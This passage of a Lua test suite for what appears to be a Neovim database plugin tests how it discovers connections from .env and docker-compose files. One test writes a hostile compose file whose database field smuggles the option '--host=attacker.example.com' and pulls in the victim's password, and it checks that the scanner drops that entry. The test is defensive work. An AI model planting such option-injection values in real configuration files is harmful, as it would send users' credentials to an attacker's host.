    write(root .. '/vendor/dev.sqlite3', SQLITE_HEADER)
    write(root .. '/.env', 'DATABASE_URL=sqlite://vendor/dev.sqlite3\n')
    local found, report = scan(root)
    eq(report.skipped, 0, { fail_reason = 'containment dropped a path inside the root' })
    eq(by_name(found, 'DATABASE_URL') ~= nil, true)
    eq(by_name(found, 'DATABASE_URL').target.path, root .. '/vendor/dev.sqlite3')
  end)

  --- The whole exfiltration chain the review executed: a hostile compose file names a service
  --- something plausible, puts an option in the field that becomes argv, and interpolates the
  --- victim's own environment for the password.
  it('drops a candidate whose database is an option, rather than offering it', function()
    local root = vim.fn.tempname()
    write(
      root .. '/docker-compose.yml',
      table.concat({
        'services:',
        '  db:',
        '    image: mysql:8',
        -- Block form on purpose: the drop must be the validation rule, not the port parse.
        '    ports:',
        '      - "3306:3306"',
        '    environment:',
        '      MYSQL_DATABASE: --host=attacker.example.com',
        '      MYSQL_USER: root',
        '      MYSQL_PASSWORD: ${DBLENS_TEST_VICTIM_SECRET}',
        '',
      }, '\n')
    )
    local previous = vim.env.DBLENS_TEST_VICTIM_SECRET
    vim.env.DBLENS_TEST_VICTIM_SECRET = 'victims-real-production-password'
    local found, report = scan(root)
    vim.env.DBLENS_TEST_VICTIM_SECRET = previous

    eq(#found, 0, { fail_reason = 'an option-like database was offered as a connection' })
    eq(report.skipped, 1, { fail_reason = 'the hostile candidate was dropped silently' })
  end)
end)

describe('discovery: connecting what was found', function()
  --- A `.env` candidate with a password, as `env.candidates` produces one.
  local function network_candidate()
    return {
      name = 'DATABASE_URL',
      kind = 'postgres',
      origin = 'env',
      source = '.env',
      detail = '(postgres, localhost:5432/appdb, from .env)',
      target = { host = 'localhost', port = 5432, user = 'app', database = 'appdb' },
      secret = 'urlsecret',
    }
  end

  it('gives the discovered password to the client, and to nothing else', function()
    h.with_fake_exec(function()
      return {}
    end, function(_, calls)
      local app = require('dblens.app')
      local base = vim.fn.tempname()
      vim.fn.mkdir(base, 'p')
      local options = require('dblens.config').setup({
        connections_file = base .. '/connections.json',
        history_file = base .. '/history.json',
        state_file = base .. '/session.json',
        discovery = { auto = false },
      })
      app.open()
      local state = app.state()
      assert(state, 'app.open left no state')

      app.connect_discovered(network_candidate())
      vim.wait(2000, function()
        return state.session ~= nil
      end, 10)
      assert(state.session, 'the discovered candidate did not connect')

      eq(state.session.spec.name, 'DATABASE_URL')
      eq(state.session:is_read_only(), true, { fail_reason = 'a discovered connection must lock' })
      -- The password reaches the client through the environment, which is the only place it goes.
      eq(calls[1].spec.env.PGPASSWORD, 'urlsecret')
      eq(h.leaks(state.session.spec, 'urlsecret'), false, {
        fail_reason = 'the password reached the spec',
      })

      -- Even asked to save the WHOLE live list, the file gets nothing discovered.
      local ok, err = connections.save(options, state.specs)
      eq(ok, true, { fail_reason = tostring(err) })
      local written = assert(io.open(options.connections_file, 'r'))
      local text = written:read('*a')
      written:close()
      eq(text:find('urlsecret', 1, true), nil, { fail_reason = 'the password was persisted' })
      eq(text:find('DATABASE_URL', 1, true), nil, {
        fail_reason = 'the discovered connection was persisted',
      })

      app.close()
      -- Nor is it remembered as the session to restore: it will not exist next time.
      eq(io.open(options.state_file, 'r'), nil, {
        fail_reason = 'a discovered connection was saved as the restorable session',
      })
    end)
  end)
end)

describe('discovery: the workspace root', function()
  it('is the git repository the path is in', function()
    local root = fixture_workspace()
    vim.fn.mkdir(root .. '/deep/inside', 'p')
    eq(discovery.root(root .. '/deep/inside'), vim.fs.normalize(root))
  end)

  it('is the directory itself when there is no repository', function()
    local plain = vim.fn.tempname()
    vim.fn.mkdir(plain, 'p')
    eq(discovery.root(plain), vim.fs.normalize(plain))
  end)
end)
